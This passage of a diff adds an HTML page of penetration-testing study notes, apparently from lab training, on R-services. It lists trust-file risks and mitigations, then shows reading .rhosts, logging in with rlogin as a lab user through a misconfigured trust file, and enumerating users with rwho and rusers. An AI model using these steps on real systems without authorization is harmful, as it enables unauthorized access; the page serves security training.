+<a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a>    - Trusted hostnames/IPs can be spoofed.
+<a id="__codelineno-19-18" name="__codelineno-19-18" href="#__codelineno-19-18"></a>3. **Unauthorized Access:**
+<a id="__codelineno-19-19" name="__codelineno-19-19" href="#__codelineno-19-19"></a>
+<a id="__codelineno-19-20" name="__codelineno-19-20" href="#__codelineno-19-20"></a>    - Improperly configured files (`+`) can allow access to anyone.
+<a id="__codelineno-19-21" name="__codelineno-19-21" href="#__codelineno-19-21"></a>    - Overlooked `.rhosts` files in user directories may create unexpected backdoors.
+<a id="__codelineno-19-22" name="__codelineno-19-22" href="#__codelineno-19-22"></a>
+<a id="__codelineno-19-23" name="__codelineno-19-23" href="#__codelineno-19-23"></a>---
+<a id="__codelineno-19-24" name="__codelineno-19-24" href="#__codelineno-19-24"></a>
+<a id="__codelineno-19-25" name="__codelineno-19-25" href="#__codelineno-19-25"></a>#### **Mitigation Strategies**
+<a id="__codelineno-19-26" name="__codelineno-19-26" href="#__codelineno-19-26"></a>
+<a id="__codelineno-19-27" name="__codelineno-19-27" href="#__codelineno-19-27"></a>1. **Replace R-services with SSH:**
+<a id="__codelineno-19-28" name="__codelineno-19-28" href="#__codelineno-19-28"></a>
+<a id="__codelineno-19-29" name="__codelineno-19-29" href="#__codelineno-19-29"></a>    - Use public-key authentication for secure connections.
+<a id="__codelineno-19-30" name="__codelineno-19-30" href="#__codelineno-19-30"></a>2. **Remove/Restrict Trust Files:**
+<a id="__codelineno-19-31" name="__codelineno-19-31" href="#__codelineno-19-31"></a>
+<a id="__codelineno-19-32" name="__codelineno-19-32" href="#__codelineno-19-32"></a>    - Delete or minimize entries in `/etc/hosts.equiv` and `.rhosts`.
+<a id="__codelineno-19-33" name="__codelineno-19-33" href="#__codelineno-19-33"></a>3. **Enforce Secure Permissions:**
+<a id="__codelineno-19-34" name="__codelineno-19-34" href="#__codelineno-19-34"></a>
+<a id="__codelineno-19-35" name="__codelineno-19-35" href="#__codelineno-19-35"></a>    - Restrict access to `/etc/hosts.equiv` (`chmod 600`).
+<a id="__codelineno-19-36" name="__codelineno-19-36" href="#__codelineno-19-36"></a>    - Regularly audit `.rhosts` files for unnecessary or dangerous entries.
+<a id="__codelineno-19-37" name="__codelineno-19-37" href="#__codelineno-19-37"></a>4. **Network Segmentation:**
+<a id="__codelineno-19-38" name="__codelineno-19-38" href="#__codelineno-19-38"></a>
+<a id="__codelineno-19-39" name="__codelineno-19-39" href="#__codelineno-19-39"></a>    - Limit access to systems using R-services to trusted internal networks only.
+<a id="__codelineno-19-40" name="__codelineno-19-40" href="#__codelineno-19-40"></a>    - 
+<a id="__codelineno-19-41" name="__codelineno-19-41" href="#__codelineno-19-41"></a>
+<a id="__codelineno-19-42" name="__codelineno-19-42" href="#__codelineno-19-42"></a>**Note:** The `hosts.equiv` file is recognized as the global configuration regarding all users on a system, whereas `.rhosts` provides a per-user configuration.
+<a id="__codelineno-19-43" name="__codelineno-19-43" href="#__codelineno-19-43"></a>
+<a id="__codelineno-19-44" name="__codelineno-19-44" href="#__codelineno-19-44"></a>```bash
+<a id="__codelineno-19-45" name="__codelineno-19-45" href="#__codelineno-19-45"></a>cat .rhosts
+</code></pre></div></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="logging-in-using-rlogin">Logging in Using Rlogin</h2>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>rlogin<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-l<span class="w"> </span>htb-student
+</code></pre></div>
+We have successfully logged in under the <code>htb-student</code> account on the remote host due to the misconfigurations in the <code>.rhosts</code> file. Once successfully logged in, we can also abuse the <code>rwho</code> command to list all interactive sessions on the local network by sending requests to the UDP port 513.</p>
+<h2 id="listing-authenticated-users-using-rwho">Listing Authenticated Users Using Rwho</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>rwho
+</code></pre></div>
+<h2 id="listing-authenticated-users-using-rusers">Listing Authenticated Users Using Rusers</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>rusers<span class="w"> </span>-al<span class="w"> </span>&lt;ip&gt;
+</code></pre></div>
+<p>As we can see, R-services are less frequently used nowadays due to their inherent security flaws and the availability of more secure protocols such as SSH. To be a well-rounded information security professional, we must have a broad and deep understanding of many systems, applications, protocols, etc. So, file away this knowledge about R-services because you never know when you may encounter them.</p>
+<h2 id="final-thoughts">Final Thoughts</h2>
+<p>Remote management services can provide us with a treasure trove of data and often be abused for unauthorized access through either weak/default credentials or password re-use. We should always probe these services for as much information as we can gather and leave no stone unturned, especially when we have compiled a list of credentials from elsewhere in the target network.</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy", "content.code.annotation", "search.suggest", "search.highlight"], "search": "../../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.f1b6f286.min.js"></script>
+      
+    
+  </body>
+</html>
